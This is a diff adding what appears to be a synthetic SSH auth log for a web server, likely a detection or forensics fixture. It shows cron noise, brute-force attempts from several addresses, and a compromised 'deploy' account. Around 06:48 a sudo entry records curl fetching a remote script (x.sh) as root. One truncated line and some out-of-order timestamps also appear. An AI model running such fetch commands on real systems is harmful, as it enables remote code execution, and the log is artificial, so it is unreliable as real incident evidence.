@@ -1,0 +1,238 @@
+2026-11-05T00:02:11.295241+01:00 srv-web-01 CRON[2908]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T00:02:12.197030+01:00 srv-web-01 CRON[2908]: pam_unix(cron:session): session closed for user root
+2026-11-05T00:12:11.323347+01:00 srv-web-01 CRON[2911]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T00:12:12.177433+01:00 srv-web-01 CRON[2911]: pam_unix(cron:session): session closed for user root
+2026-11-05T00:22:11.669449+01:00 srv-web-01 CRON[2914]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T00:22:12.575373+01:00 srv-web-01 CRON[2914]: pam_unix(cron:session): session closed for user root
+2026-11-05T00:32:11.224527+01:00 srv-web-01 CRON[2916]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T00:32:12.234468+01:00 srv-web-01 CRON[2916]: pam_unix(cron:session): session closed for user root
+2026-11-05T00:42:11.786947+01:00 srv-web-01 CRON[2917]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T00:42:12.217541+01:00 srv-web-01 CRON[2917]: pam_unix(cron:session): session closed for user root
+2026-11-05T00:52:11.154686+01:00 srv-web-01 CRON[2918]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T00:52:12.906272+01:00 srv-web-01 CRON[2918]: pam_unix(cron:session): session closed for user root
+2026-11-05T01:02:11.974144+01:00 srv-web-01 CRON[2927]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T01:02:12.612844+01:00 srv-web-01 CRON[2927]: pam_unix(cron:session): session closed for user root
+2026-11-05T01:10:11.613030+01:00 srv-web-01 sshd[2935]: Accepted publickey for bob from 10.0.0.12 port 39897 ssh2
+2026-11-05T01:10:11.552322+01:00 srv-web-01 sshd[2935]: pam_unix(sshd:session): session opened for user bob(uid=1001) by bob(uid=0)
+2026-11-05T01:12:11.236299+01:00 srv-web-01 CRON[2938]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T01:12:12.872797+01:00 srv-web-01 CRON[2938]: pam_unix(cron:session): session closed for user root
+2026-11-05T01:19:11.846469+01:00 srv-web-01 sshd[2935]: pam_unix(sshd:session): session closed for user bob
+2026-11-05T01:22:11.842137+01:00 srv-web-01 CRON[2942]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T01:22:12.539764+01:00 srv-web-01 CRON[2942]: pam_unix(cron:session): session closed for user root
+2026-11-05T01:32:11.902001+01:00 srv-web-01 CRON[2944]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T01:32:12.421847+01:00 srv-web-01 CRON[2944]: pam_unix(cron:session): session closed for user root
+2026-11-05T01:42:11.823653+01:00 srv-web-01 CRON[2947]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T01:42:12.122387+01:00 srv-web-01 CRON[2947]: pam_unix(cron:session): session closed for user root
+2026-11-05T01:52:11.175560+01:00 srv-web-01 CRON[2949]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T01:52:12.776946+01:00 srv-web-01 CRON[2949]: pam_unix(cron:session): session closed for user root
+2026-11-05T02:02:11.940628+01:00 srv-web-01 CRON[2954]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T02:02:12.782556+01:00 srv-web-01 CRON[2954]: pam_unix(cron:session): session closed for user root
+2026-11-05T02:12:11.279064+01:00 srv-web-01 CRON[2958]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T02:12:12.125184+01:00 srv-web-01 CRON[2958]: pam_unix(cron:session): session closed for user root
+2026-11-05T02:16:11.225077+01:00 srv-web-01 sshd[2960]: Failed password for alice from 10.0.0.15 port 41148 ssh2
+2026-11-05T02:16:20.340985+01:00 srv-web-01 sshd[2968]: Accepted password for alice from 10.0.0.15 port 31747 ssh2
+2026-11-05T02:16:20.597458+01:00 srv-web-01 sshd[2968]: pam_unix(sshd:session): session opened for user alice(uid=1000) by alice(uid=0)
+2026-11-05T02:18:11.149840+01:00 srv-web-01 sudo[2975]:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+2026-11-05T02:22:11.488857+01:00 srv-web-01 CRON[2983]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T02:22:12.365849+01:00 srv-web-01 CRON[2983]: pam_unix(cron:session): session closed for user root
+2026-11-05T02:32:11.110160+01:00 srv-web-01 CRON[2990]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T02:32:12.696817+01:00 srv-web-01 CRON[2990]: pam_unix(cron:session): session closed for user root
+2026-11-05T02:38:20.535775+01:00 srv-web-01 sshd[2968]: pam_unix(sshd:session): session closed for user alice
+2026-11-05T02:42:11.027146+01:00 srv-web-01 CRON[2993]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T02:42:12.192043+01:00 srv-web-01 CRON[2993]: pam_unix(cron:session): session closed for user root
+2026-11-05T02:52:11.181210+01:00 srv-web-01 CRON[2994]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T02:52:12.059333+01:00 srv-web-01 CRON[2994]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:02:11.648048+01:00 srv-web-01 CRON[3003]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T03:02:12.040421+01:00 srv-web-01 CRON[3003]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:09:11.097125+01:00 srv-web-01 sshd[3009]: Failed password for root from 203.0.113.45 port 52111 ssh2
+2026-11-05T03:09:14.922404+01:00 srv-web-01 sshd[3018]: Invalid user oracle from 203.0.113.45 port 34426
+2026-11-05T03:09:16.308353+01:00 srv-web-01 sshd[3018]: Failed password for invalid user oracle from 203.0.113.45 port 34426 ssh2
+2026-11-05T03:09:20.089481+01:00 srv-web-01 sshd[3026]: Failed password for root from 203.0.113.45 port 61450 ssh2
+2026-11-05T03:09:24.845192+01:00 srv-web-01 sshd[3027]: Invalid user test from 203.0.113.45 port 37247
+2026-11-05T03:09:26.496193+01:00 srv-web-01 sshd[3027]: Failed password for invalid user test from 203.0.113.45 port 37247 ssh2
+2026-11-05T03:09:30.027802+01:00 srv-web-01 sshd[3031]: Failed password for root from 203.0.113.45 port 58274 ssh2
+2026-11-05T03:09:33.509213+01:00 srv-web-01 sshd[3039]: Invalid user oracle from 203.0.113.45 port 33542
+2026-11-05T03:09:35.041168+01:00 srv-web-01 sshd[3039]: Failed password for invalid user oracle from 203.0.113.45 port 33542 ssh2
+2026-11-05T03:09:39.460159+01:00 srv-web-01 sshd[3041]: Invalid user oracle from 203.0.113.45 port 58607
+2026-11-05T03:09:41.332190+01:00 srv-web-01 sshd[3041]: Failed password for invalid user oracle from 203.0.113.45 port 58607 ssh2
+2026-11-05T03:09:44.623419+01:00 srv-web-01 sshd[3043]: Failed password for root from 203.0.113.45 port 45054 ssh2
+2026-11-05T03:09:47.758782+01:00 srv-web-01 sshd[3049]: Failed password for root from 203.0.113.45 port 31962 ssh2
+2026-11-05T03:09:50.630699+01:00 srv-web-01 sshd[3057]: Failed password for root from 203.0.113.45 port 63017 ssh2
+2026-11-05T03:09:53.157681+01:00 srv-web-01 sshd[3065]: Invalid user test from 203.0.113.45 port 49413
+2026-11-05T03:09:55.759015+01:00 srv-web-01 sshd[3065]: Failed password for invalid user test from 203.0.113.45 port 49413 ssh2
+2026-11-05T03:09:59.162928+01:00 srv-web-01 sshd[3066]: Failed password for root from 203.0.113.45 port 40208 ssh2
+2026-11-05T03:10:05.807101+01:00 srv-web-01 sshd[3067]: Failed password for root from 203.0.113.45 port 63937 ssh2
+2026-11-05T03:10:10.915543+01:00 srv-web-01 sshd[3075]: Invalid user admin from 203.0.113.45 port 46762
+2026-11-05T03:10:12.647894+01:00 srv-web-01 sshd[3075]: Failed password for invalid user admin from 203.0.113.45 port 46762 ssh2
+2026-11-05T03:10:16.134007+01:00 srv-web-01 sshd[3082]: Failed password for root from 203.0.113.45 port 35571 ssh2
+2026-11-05T03:10:20.963361+01:00 srv-web-01 sshd[3085]: Failed password for root from 203.0.113.45 port 35843 ssh2
+2026-11-05T03:10:26.792139+01:00 srv-web-01 sshd[3088]: Failed password for root from 203.0.113.45 port 45800 ssh2
+2026-11-05T03:10:30.625185+01:00 srv-web-01 sshd[3095]: Failed password for root from 203.0.113.45 port 46743 ssh2
+2026-11-05T03:10:36.438555+01:00 srv-web-01 sshd[3099]: Invalid user admin from 203.0.113.45 port 38311
+2026-11-05T03:10:38.707645+01:00 srv-web-01 sshd[3099]: Failed password for invalid user admin from 203.0.113.45 port 38311 ssh2
+2026-11-05T03:10:42.323151+01:00 srv-web-01 sshd[3101]: Failed password for root from 203.0.113.45 port 33031 ssh2
+2026-11-05T03:10:45.892603+01:00 srv-web-01 sshd[3102]: Failed password for root from 203.0.113.45 port 52426 ssh2
+2026-11-05T03:10:48.372003+01:00 srv-web-01 sshd[3110]: Failed password for root from 203.0.113.45 port 55600 ssh2
+2026-11-05T03:10:51.427582+01:00 srv-web-01 sshd[3117]: Invalid user admin from 203.0.113.45 port 62295
+2026-11-05T03:10:53.922420+01:00 srv-web-01 sshd[3117]: Failed password for invalid user admin from 203.0.113.45 port 62295 ssh2
+2026-11-05T03:10:57.804202+01:00 srv-web-01 sshd[3122]: Invalid user admin from 203.0.113.45 port 37537
+2026-11-05T03:10:59.210272+01:00 srv-web-01 sshd[3122]: Failed password for invalid user admin from 203.0.113.45 port 37537 ssh2
+
+2026-11-05T03:11:01.682900+01:00 srv-web-01 sshd[3131]: Invalid user oracle from 203.0.113.45 port 56616
+2026-11-05T03:11:03.460189+01:00 srv-web-01 sshd[3131]: Failed password for invalid user oracle from 203.0.113.45 port 56616 ssh2
+2026-11-05T03:11:04.451619+01:00 srv-web-01 sshd[3133]: Failed password for root from 203.0.113.45 port 38425 ssh2
+2026-11-05T03:11:09.224668+01:00 srv-web-01 sshd[3136]: Failed password for root from 203.0.113.45 port 60446 ssh2
+2026-11-05T03:11:14.978453+01:00 srv-web-01 sshd[3141]: Failed password for root from 203.0.113.45 port 57455 ssh2
+2026-11-05T03:11:19.048237+01:00 srv-web-01 sshd[3149]: Invalid user admin from 203.0.113.45 port 59817
+2026-11-05T03:11:21.324061+01:00 srv-web-01 sshd[3149]: Failed password for invalid user admin from 203.0.113.45 port 59817 ssh2
+2026-11-05T03:11:25.161789+01:00 srv-web-01 sshd[3157]: Invalid user test from 203.0.113.45 port 43794
+2026-11-05T03:11:27.831173+01:00 srv-web-01 sshd[3157]: Failed password for invalid user test from 203.0.113.45 port 43794 ssh2
+2026-11-05T03:11:30.898342+01:00 srv-web-01 sshd[3159]: Invalid user admin from 203.0.113.45 port 35860
+2026-11-05T03:11:32.709131+01:00 srv-web-01 sshd[3159]: Failed password for invalid user admin from 203.0.113.45 port 35860 ssh2
+2026-11-05T03:11:33.620529+01:00 srv-web-01 sshd[3167]: Failed password for root from 203.0.113.45 port 62921 ssh2
+2026-11-05T03:11:37.526904+01:00 srv-web-01 sshd[3175]: Invalid user test from 203.0.113.45 port 63922
+2026-11-05T03:11:39.129910+01:00 srv-web-01 sshd[3175]: Failed password for invalid user test from 203.0.113.45 port 63922 ssh2
+2026-11-05T03:11:42.719489+01:00 srv-web-01 sshd[3181]: Invalid user oracle from 203.0.113.45 port 64004
+2026-11-05T03:11:44.401448+01:00 srv-web-01 sshd[3181]: Failed password for invalid user oracle from 203.0.113.45 port 64004 ssh2
+2026-11-05T03:11:48.410344+01:00 srv-web-01 sshd[3185]: Invalid user admin from 203.0.113.45 port 31063
+2026-11-05T03:11:50.573471+01:00 srv-web-01 sshd[3185]: Failed password for invalid user admin from 203.0.113.45 port 31063 ssh2
+2026-11-05T03:11:52.190758+01:00 srv-web-01 sshd[3187]: Invalid user admin from 203.0.113.45 port 64712
+2026-11-05T03:11:54.605722+01:00 srv-web-01 sshd[3187]: Failed password for invalid user admin from 203.0.113.45 port 64712 ssh2
+2026-11-05T03:11:57.160333+01:00 srv-web-01 sshd[3195]: Failed password for root from 203.0.113.45 port 38960 ssh2
+2026-11-05T03:12:00.245302+01:00 srv-web-01 sshd[3196]: Failed password for root from 203.0.113.45 port 46210 ssh2
+2026-11-05T03:12:05.226523+01:00 srv-web-01 sshd[3195]: message repeated 3 times: [ Failed password for root from 203.0.113.45 port 51122 ssh2]
+2026-11-05T03:12:06.526354+01:00 srv-web-01 sshd[3201]: Disconnecting authenticating user root 203.0.113.45 port 51130: Too many authentication failures [preauth]
+2026-11-05T03:12:11.783240+01:00 srv-web-01 CRON[3204]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T03:12:12.864423+01:00 srv-web-01 CRON[3204]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:22:11.476831+01:00 srv-web-01 CRON[3209]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T03:22:12.468208+01:00 srv-web-01 CRON[3209]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:28:11.143491+01:00 srv-web-01 sshd[3213]: Accepted publickey for bob from 10.0.0.12 port 41130 ssh2
+2026-11-05T03:28:11.924766+01:00 srv-web-01 sshd[3213]: pam_unix(sshd:session): session opened for user bob(uid=1001) by bob(uid=0)
+2026-11-05T03:32:11.647087+01:00 srv-web-01 CRON[3216]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T03:32:12.746647+01:00 srv-web-01 CRON[3216]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:42:11.744855+01:00 srv-web-01 CRON[3224]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T03:42:12.937434+01:00 srv-web-01 CRON[3224]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:52:11.096710+01:00 srv-web-01 CRON[3228]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T03:52:12.269369+01:00 srv-web-01 CRON[3228]: pam_unix(cron:session): session closed for user root
+2026-11-05T03:58:11.809255+01:00 srv-web-01 sshd[3213]: pam_unix(sshd:session): session closed for user bob
+2026-11-05T04:02:11.378650+01:00 srv-web-01 CRON[3232]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T04:02:12.332816+01:00 srv-web-01 CRON[3232]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:02:11.152545+01:00 srv-web-01 sshd[3235]: Failed password for
+2026-11-05T04:12:11.922754+01:00 srv-web-01 CRON[3242]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T04:12:12.555547+01:00 srv-web-01 CRON[3242]: pam_unix(cron:session): session closed for user root
+2026-11-05T04:22:11.790374+01:00 srv-web-01 CRON[3246]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T04:22:12.023059+01:00 srv-web-01 CRON[3246]: pam_unix(cron:session): session closed for user root
+2026-11-05T04:32:11.248783+01:00 srv-web-01 CRON[3252]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T04:32:11.219104+01:00 srv-web-01 sshd[3259]: Invalid user admin from 198.51.100.23 port 43256
+2026-11-05T04:32:12.907047+01:00 srv-web-01 CRON[3252]: pam_unix(cron:session): session closed for user root
+2026-11-05T04:32:13.256027+01:00 srv-web-01 sshd[3259]: Failed password for invalid user admin from 198.51.100.23 port 43256 ssh2
+2026-11-05T04:37:11.690472+01:00 srv-web-01 sshd[3267]: Invalid user ubuntu from 198.51.100.23 port 30142
+2026-11-05T04:37:13.545615+01:00 srv-web-01 sshd[3267]: Failed password for invalid user ubuntu from 198.51.100.23 port 30142 ssh2
+2026-11-05T04:40:11.729614+01:00 srv-web-01 sshd[3276]: Invalid user postgres from 198.51.100.23 port 57839
+2026-11-05T04:40:13.575533+01:00 srv-web-01 sshd[3276]: Failed password for invalid user postgres from 198.51.100.23 port 57839 ssh2
+2026-11-05T04:42:11.094518+01:00 srv-web-01 CRON[3284]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T04:42:12.730967+01:00 srv-web-01 CRON[3284]: pam_unix(cron:session): session closed for user root
+2026-11-05T04:43:11.145266+01:00 srv-web-01 sshd[3289]: Invalid user git from 198.51.100.23 port 41912
+2026-11-05T04:43:13.277965+01:00 srv-web-01 sshd[3289]: Failed password for invalid user git from 198.51.100.23 port 41912 ssh2
+2026-11-05T04:47:11.827911+01:00 srv-web-01 sshd[3295]: Invalid user jenkins from 198.51.100.23 port 33908
+2026-11-05T04:47:13.517483+01:00 srv-web-01 sshd[3295]: Failed password for invalid user jenkins from 198.51.100.23 port 33908 ssh2
+2026-11-05T04:51:11.247648+01:00 srv-web-01 sshd[3298]: Failed password for www-data from 198.51.100.23 port 32930 ssh2
+2026-11-05T04:52:11.488974+01:00 srv-web-01 CRON[3301]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T04:52:12.026283+01:00 srv-web-01 CRON[3301]: pam_unix(cron:session): session closed for user root
+2026-11-05T04:56:11.580935+01:00 srv-web-01 sshd[3310]: Invalid user ftp from 198.51.100.23 port 60232
+2026-11-05T04:56:13.233816+01:00 srv-web-01 sshd[3310]: Failed password for invalid user ftp from 198.51.100.23 port 60232 ssh2
+2026-11-05T04:59:11.878671+01:00 srv-web-01 sshd[3314]: Invalid user pi from 198.51.100.23 port 41892
+2026-11-05T04:59:13.575162+01:00 srv-web-01 sshd[3314]: Failed password for invalid user pi from 198.51.100.23 port 41892 ssh2
+2026-11-05T05:02:11.395580+01:00 srv-web-01 CRON[3321]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T05:02:12.909583+01:00 srv-web-01 CRON[3321]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:03:11.762393+01:00 srv-web-01 sshd[3327]: Invalid user support from 198.51.100.23 port 50843
+2026-11-05T05:03:13.732129+01:00 srv-web-01 sshd[3327]: Failed password for invalid user support from 198.51.100.23 port 50843 ssh2
+2026-11-05T05:04:11.333523+01:00 srv-web-01 sshd[3328]: Connection closed by 203.0.113.99 port 40022 [preauth]
+2026-11-05T05:04:12.913537+01:00 srv-web-01 sshd[3330]: error: kex_exchange_identification: Connection closed by remote host
+2026-11-05T05:07:11.698268+01:00 srv-web-01 sshd[3331]: Failed password for backup from 198.51.100.23 port 47930 ssh2
+2026-11-05T05:11:11.208398+01:00 srv-web-01 sshd[3332]: Invalid user user from 198.51.100.23 port 62280
+2026-11-05T05:11:13.748567+01:00 srv-web-01 sshd[3332]: Failed password for invalid user user from 198.51.100.23 port 62280 ssh2
+2026-11-05T05:12:11.585782+01:00 srv-web-01 CRON[3340]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T05:12:12.203499+01:00 srv-web-01 CRON[3340]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:15:11.512837+01:00 srv-web-01 sshd[3346]: Invalid user guest from 198.51.100.23 port 49495
+2026-11-05T05:15:13.235642+01:00 srv-web-01 sshd[3346]: Failed password for invalid user guest from 198.51.100.23 port 49495 ssh2
+2026-11-05T05:21:11.923156+01:00 srv-web-01 sshd[3354]: Accepted publickey for bob from 10.0.0.12 port 41163 ssh2
+2026-11-05T05:21:11.045153+01:00 srv-web-01 sshd[3354]: pam_unix(sshd:session): session opened for user bob(uid=1001) by bob(uid=0)
+2026-11-05T05:22:11.980292+01:00 srv-web-01 CRON[3358]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T05:22:12.349146+01:00 srv-web-01 CRON[3358]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:32:11.820744+01:00 srv-web-01 CRON[3364]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T05:32:12.582799+01:00 srv-web-01 CRON[3364]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:42:11.036199+01:00 srv-web-01 CRON[3372]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T05:42:12.790322+01:00 srv-web-01 CRON[3372]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:52:11.417145+01:00 srv-web-01 CRON[3378]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T05:52:12.238448+01:00 srv-web-01 CRON[3378]: pam_unix(cron:session): session closed for user root
+2026-11-05T05:53:11.340882+01:00 srv-web-01 sshd[3354]: pam_unix(sshd:session): session closed for user bob
+2026-11-05T06:02:11.017535+01:00 srv-web-01 CRON[3379]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T06:02:12.704466+01:00 srv-web-01 CRON[3379]: pam_unix(cron:session): session closed for user root
+2026-11-05T06:12:11.562334+01:00 srv-web-01 CRON[3385]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T06:12:12.526455+01:00 srv-web-01 CRON[3385]: pam_unix(cron:session): session closed for user root
+2026-11-05T06:22:11.849031+01:00 srv-web-01 CRON[3386]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T06:22:12.129157+01:00 srv-web-01 CRON[3386]: pam_unix(cron:session): session closed for user root
+2026-11-05T06:32:11.201865+01:00 srv-web-01 CRON[3392]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T06:32:12.874672+01:00 srv-web-01 CRON[3392]: pam_unix(cron:session): session closed for user root
+2026-11-05T06:42:11.425379+01:00 srv-web-01 CRON[3398]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T06:42:12.228346+01:00 srv-web-01 CRON[3398]: pam_unix(cron:session): session closed for user root
+2026-11-05T06:43:11.417547+01:00 srv-web-01 sshd[3407]: Failed password for deploy from 192.0.2.77 port 58758 ssh2
+2026-11-05T06:43:33.493144+01:00 srv-web-01 sshd[3408]: Failed password for deploy from 192.0.2.77 port 46615 ssh2
+2026-11-05T06:43:57.273843+01:00 srv-web-01 sshd[3412]: Failed password for deploy from 192.0.2.77 port 50113 ssh2
+2026-11-05T06:44:35.508346+01:00 srv-web-01 sshd[3420]: Failed password for deploy from 192.0.2.77 port 49423 ssh2
+2026-11-05T06:45:18.531003+01:00 srv-web-01 sshd[3422]: Failed password for deploy from 192.0.2.77 port 59456 ssh2
+2026-11-05T06:45:42.614979+01:00 srv-web-01 sshd[3424]: Failed password for deploy from 192.0.2.77 port 56552 ssh2
+2026-11-05T06:46:21.153666+01:00 srv-web-01 sshd[3432]: Failed password for deploy from 192.0.2.77 port 34756 ssh2
+2026-11-05T06:47:00.426512+01:00 srv-web-01 sshd[3438]: Failed password for deploy from 192.0.2.77 port 56671 ssh2
+2026-11-05T06:47:49.478558+01:00 srv-web-01 sshd[3447]: Accepted password for deploy from 192.0.2.77 port 63432 ssh2
+2026-11-05T06:47:49.155614+01:00 srv-web-01 sshd[3447]: pam_unix(sshd:session): session opened for user deploy(uid=1003) by deploy(uid=0)
+2026-11-05T06:48:49.528070+01:00 srv-web-01 sudo[3452]:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.200/x.sh
+2026-11-05T06:52:11.079221+01:00 srv-web-01 CRON[3460]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T06:52:12.553579+01:00 srv-web-01 CRON[3460]: pam_unix(cron:session): session closed for user root
+2026-11-05T07:00:49.159780+01:00 srv-web-01 sshd[3447]: pam_unix(sshd:session): session closed for user deploy
+2026-11-05T07:02:11.642945+01:00 srv-web-01 CRON[3463]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T07:02:12.099200+01:00 srv-web-01 CRON[3463]: pam_unix(cron:session): session closed for user root
+2026-11-05T07:12:11.633692+01:00 srv-web-01 CRON[3472]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T07:12:12.793358+01:00 srv-web-01 CRON[3472]: pam_unix(cron:session): session closed for user root
+2026-11-05T07:14:11.391481+01:00 srv-web-01 sshd[3475]: Failed password for root from 2001:db8::66 port 53836 ssh2
+2026-11-05T07:14:21.111099+01:00 srv-web-01 sshd[3483]: Failed password for root from 2001:db8::66 port 46980 ssh2
+2026-11-05T07:14:36.476899+01:00 srv-web-01 sshd[3485]: Failed password for root from 2001:db8::66 port 58775 ssh2
+2026-11-05T07:14:51.718889+01:00 srv-web-01 sshd[3493]: Failed password for root from 2001:db8::66 port 46642 ssh2
+2026-11-05T07:15:05.949247+01:00 srv-web-01 sshd[3500]: Failed password for root from 2001:db8::66 port 55998 ssh2
+2026-11-05T07:15:15.142490+01:00 srv-web-01 sshd[3509]: Failed password for root from 2001:db8::66 port 50363 ssh2
+2026-11-05T07:22:11.083087+01:00 srv-web-01 CRON[3513]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T07:22:12.223691+01:00 srv-web-01 CRON[3513]: pam_unix(cron:session): session closed for user root
+2026-11-05T07:32:11.761624+01:00 srv-web-01 CRON[3516]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T07:32:12.496307+01:00 srv-web-01 CRON[3516]: pam_unix(cron:session): session closed for user root
+2026-11-05T07:42:11.873296+01:00 srv-web-01 CRON[3518]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T07:42:12.538970+01:00 srv-web-01 CRON[3518]: pam_unix(cron:session): session closed for user root
+2026-11-05T07:52:11.972242+01:00 srv-web-01 CRON[3521]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T07:52:12.253533+01:00 srv-web-01 CRON[3521]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:02:11.654466+01:00 srv-web-01 CRON[3522]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T08:02:12.877697+01:00 srv-web-01 CRON[3522]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:12:11.552662+01:00 srv-web-01 CRON[3525]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T08:12:12.197058+01:00 srv-web-01 CRON[3525]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:22:11.215300+01:00 srv-web-01 CRON[3532]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T08:22:12.041139+01:00 srv-web-01 CRON[3532]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:32:11.478392+01:00 srv-web-01 CRON[3537]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T08:32:12.354487+01:00 srv-web-01 CRON[3537]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:40:11.462771+01:00 srv-web-01 sshd[3541]: Accepted publickey for bob from 10.0.0.12 port 50480 ssh2
+2026-11-05T08:40:11.843778+01:00 srv-web-01 sshd[3541]: pam_unix(sshd:session): session opened for user bob(uid=1001) by bob(uid=0)
+2026-11-05T08:42:11.945915+01:00 srv-web-01 CRON[3549]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T08:42:12.679943+01:00 srv-web-01 CRON[3549]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:52:11.242891+01:00 srv-web-01 CRON[3550]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T08:52:12.996215+01:00 srv-web-01 CRON[3550]: pam_unix(cron:session): session closed for user root
+2026-11-05T08:54:11.027579+01:00 srv-web-01 sshd[3541]: pam_unix(sshd:session): session closed for user bob
+2026-11-05T09:02:11.219480+01:00 srv-web-01 CRON[3555]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T09:02:12.143314+01:00 srv-web-01 CRON[3555]: pam_unix(cron:session): session closed for user root
+2026-11-05T09:12:11.319006+01:00 srv-web-01 CRON[3558]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T09:12:12.249166+01:00 srv-web-01 CRON[3558]: pam_unix(cron:session): session closed for user root
+2026-11-05T09:22:11.175317+01:00 srv-web-01 CRON[3564]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T09:22:12.043785+01:00 srv-web-01 CRON[3564]: pam_unix(cron:session): session closed for user root
+2026-11-05T09:32:11.396001+01:00 srv-web-01 CRON[3570]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T09:32:12.720256+01:00 srv-web-01 CRON[3570]: pam_unix(cron:session): session closed for user root
+2026-11-05T09:42:11.428807+01:00 srv-web-01 CRON[3579]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T09:42:12.160261+01:00 srv-web-01 CRON[3579]: pam_unix(cron:session): session closed for user root
+2026-11-05T09:52:11.224781+01:00 srv-web-01 CRON[3588]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+2026-11-05T09:52:12.425210+01:00 srv-web-01 CRON[3588]: pam_unix(cron:session): session closed for user root
